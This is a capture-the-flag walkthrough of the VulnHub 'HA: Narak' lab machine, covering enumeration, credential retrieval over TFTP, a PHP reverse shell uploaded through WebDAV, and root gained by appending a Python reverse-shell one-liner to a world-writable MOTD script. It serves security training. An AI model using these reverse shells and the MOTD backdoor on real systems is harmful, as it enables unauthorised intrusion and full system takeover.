# VulnHub > HA Narak

**About Release**

* Name: HA: Narak
* Date release: 23 Sep 2020
* Author: Hacking Articles
* Series: HA

**Description**

Narak is the Hindu equivalent of Hell. You are in the pit with the Lord of Hell himself. Can you use your hacking skills to get out of the Narak? Burning walls and demons are around every corner even your trusty tools will betray you on this quest. Trust no one. Just remember the ultimate mantra to escape Narak “Enumeration”. After getting the root you will indeed agree “Hell ain’t a bad place to be”.

Objective: Find 2 flags (`user.txt` and `root.txt`)

**Download**

* narak.ova (Size: 791 MB)
* Download: https://drive.google.com/file/d/1BpSWB9Tx3IUI0-97kP-1lGAd3ZxYx5Q0/view
* Download (Mirror): https://download.vulnhub.com/ha/narak.ova
* Download (Torrent): https://download.vulnhub.com/ha/narak.ova.torrent ([Magnet](magnet:?xt=urn:btih:FA787686512E8C5A2764BE0D9793D4DCC32A99F2&dn=narak.ova&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969))

# User flag

## Services Enumeration

Scanning the target with Nmap will reveal 2 open ports: SSH and HTTP, on their standard ports:

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 71:bd:59:2d:22:1e:b3:6b:4f:06:bf:83:e1:cc:92:43 (RSA)
|   256 f8:ec:45:84:7f:29:33:b2:8d:fc:7d:07:28:93:31:b0 (ECDSA)
|_  256 d0:94:36:96:04:80:33:10:40:68:32:21:cb:ae:68:f9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: NARAK
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Web Enumeration

Enumerating the target with `gobuster` will reveal the existence of a hidden `/webdav` directory, as well as a `/tips.txt` file:

~~~
kali@kali:~$ gobuster dir -u http://narak.box -x php,txt,bak,old,tar,zip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://narak.box
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     old,tar,zip,php,txt,bak
[+] Timeout:        10s
===============================================================
2020/10/04 17:24:48 Starting gobuster
===============================================================
/images (Status: 301)
/tips.txt (Status: 200)
/webdav (Status: 401)
/server-status (Status: 403)
===============================================================
2020/10/04 17:26:49 Finished
===============================================================
~~~

The `/tips.txt` file refers to a `creds.txt` file that doesn't seem to be available via the web service.

~~~
kali@kali:/data/HA_Narak/files$ curl -s http://narak.box/tips.txt
Hint to open the door of narak can be found in creds.txt.
~~~

## TFTP server

As there ae no other open TCP ports, let's check if the target is running a TFTP server (usually running on port 69/udp):

~~~
kali@kali:/data/HA_Narak/files$ sudo nmap -sU -p 69 narak.box 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 17:42 CEST
Nmap scan report for narak.box (172.16.222.155)
Host is up (0.00031s latency).

PORT   STATE         SERVICE
69/udp open|filtered tftp
MAC Address: 00:0C:29:88:1B:29 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
~~~

It does! Let's get the `creds.txt` file.

~~~
kali@kali:/data/HA_Narak/files$ tftp narak.box
tftp> get creds.txt
Received 22 bytes in 0.0 seconds
tftp> quit
kali@kali:/data/HA_Narak/files$ cat creds.txt | base64 -d
yamdoot:Swarg
~~~

We are now provided with credentials. However, I failed to authenticate against the SSH service.

## Webdav

Let's use the credentials to connect to the `/webdav` service instead. The webdav service doesn't contain any file yet.

~~~
kali@kali:/data/HA_Narak/files$ cadaver http://narak.box/webdav
Authentication required for webdav on server `narak.box':
Username: yamdoot
Password: Swarg
dav:/webdav/> ls
Listing collection `/webdav/': collection is empty.
dav:/webdav/> 
~~~

Let's upload a reverse shell (get it from [pentestmonkey](http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz) and don't forget to change your IP and port):

~~~
dav:/webdav/> put revshell.php 
Uploading revshell.php to `/webdav/revshell.php':
Progress: [=============================>] 100.0% of 5496 bytes succeeded.
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        revshell.php                        5496  Oct  4 17:53
dav:/webdav/> 
~~~

Now, start a listener (`rlwrap nc -nlvp 4444`) and browse the reverse shell URL (http://narak.box/webdav/revshell.php). You should now have a reverse shell spawned to the listener window:

~~~
kali@kali:/data/HA_Narak/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.16.222.128] from (UNKNOWN) [172.16.222.155] 45460
Linux ubuntu 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 08:56:54 up 41 min,  0 users,  load average: 0.00, 0.00, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@ubuntu:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/$ 
~~~

## Lateral move (www-data -> inferno)

Enumerating the target will reveal the existence of a script owned by `root` in the `/mnt` directory. The script contains a string encoded in the Brainfuck language.

~~~
www-data@ubuntu:/mnt$ ls -la /mnt
ls -la /mnt
total 16
drwxr-xr-x  3 root   root 4096 Sep 22 04:36 .
drwxr-xr-x 22 root   root 4096 Sep 21 09:56 ..
-rwxrwxrwx  1 root   root  124 Sep 22 04:36 hell.sh
drwxr-xr-x  2 nobody root 4096 Sep 21 11:15 karma
www-data@ubuntu:/mnt$ cat hell.sh
cat hell.sh
#!/bin/bash

echo"Highway to Hell";
--[----->+<]>---.+++++.+.+++++++++++.--.+++[->+++<]>++.++++++.--[--->+<]>--.-----.++++.
~~~

You can use [dcode.fr](https://www.dcode.fr/langage-brainfuck) to decode the message: `chitragupt`. Checking the other users in the `/home` directory reveals the existence of 3 users: `inferno`, `narak` and `yamdoot`. Trying this decoded string (I assumed it could be a password) confirmed that it is `inferno`'s password:

~~~
kali@kali:/data/src$ sshpass -p "chitragupt" ssh inferno@narak.box
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

inferno@ubuntu:~$ id
uid=1002(inferno) gid=1002(inferno) groups=1002(inferno)
~~~

## User flag

The user flag can be found in `inferno`'s home:

~~~
inferno@ubuntu:~$ ls -la
total 28
drwxr-xr-x 3 inferno inferno 4096 Oct  4 09:28 .
drwxr-xr-x 5 root    root    4096 Sep 22 04:35 ..
-rw-r--r-- 1 inferno inferno  220 Sep 22 04:35 .bash_logout
-rw-r--r-- 1 inferno inferno 3771 Sep 22 04:35 .bashrc
drwx------ 2 inferno inferno 4096 Oct  4 09:28 .cache
-rw-r--r-- 1 inferno inferno  807 Sep 22 04:35 .profile
-rw-r--r-- 1 root    root      41 Sep 22 04:37 user.txt
inferno@ubuntu:~$ cat user.txt 
Flag: {5f95bf06ce19af69bfa5e53f797ce6e2}
~~~

# Root flag

## Privilege escalation

Running `linpeas.sh` revealed the existence of following files owned by `root`, and world-writable:

~~~
/etc/update-motd.d/00-header
/etc/update-motd.d/10-help-text
/etc/update-motd.d/50-motd-news
/etc/update-motd.d/80-esm
/etc/update-motd.d/80-livepatch
~~~

The MOTD (Message of the Day) service is used to display a message when a user connects. Let's add a python reverse shell command to the header file as follows:

~~~
inferno@ubuntu:/etc/update-motd.d$ cat >> 00-header << EOF
> /usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.222.128",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
> EOF
~~~

Start a listener (`rlwrap nc -nlvp 4444`) on your Kali host, disconnect from the SSH session, and reconnect, to force the motd service to call the script. We now have a privileged shell:

~~~
kali@kali:/data/HA_Narak/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.16.222.128] from (UNKNOWN) [172.16.222.155] 36146
bash: cannot set terminal process group (711): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/# id
id
uid=0(root) gid=0(root) groups=0(root)
~~~

## Root flag

Let's read the root flag:

~~~
root@ubuntu:/# cd /root
cd /root
root@ubuntu:/root# ls -la
ls -la
total 24
drwx------  3 root root 4096 Sep 21 11:35 .
drwxr-xr-x 22 root root 4096 Sep 21 09:56 ..
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4096 Sep 21 10:07 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root 4044 Sep 21 11:35 root.txt
root@ubuntu:/root# cat root.txt
cat root.txt
██████████████████████████████████████████████████████████████████████████████████████████
█░░░░░░██████████░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░█
█░░▄▀░░░░░░░░░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░█
█░░▄▀▄▀▄▀▄▀▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░░░█
█░░▄▀░░░░░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░████░░▄▀░░███░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░███
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███
█░░▄▀░░██░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███
█░░▄▀░░██░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░█
█░░▄▀░░██░░░░░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀░░█
█░░░░░░██████████░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░█
██████████████████████████████████████████████████████████████████████████████████████████
                           
                                                                                    
Root Flag: {9440aee508b6215995219c58c8ba4b45}						

!! Congrats you have finished this task !!
							
Contact us here:					
								
Hacking Articles : https://twitter.com/hackinarticles

Jeenali Kothari  : https://www.linkedin.com/in/jeenali-kothari/	
															
+-+-+-+-+-+ +-+-+-+-+-+-+-+					
 |E|n|j|o|y| |H|A|C|K|I|N|G|			
 +-+-+-+-+-+ +-+-+-+-+-+-+-+						
__________________________________
~~~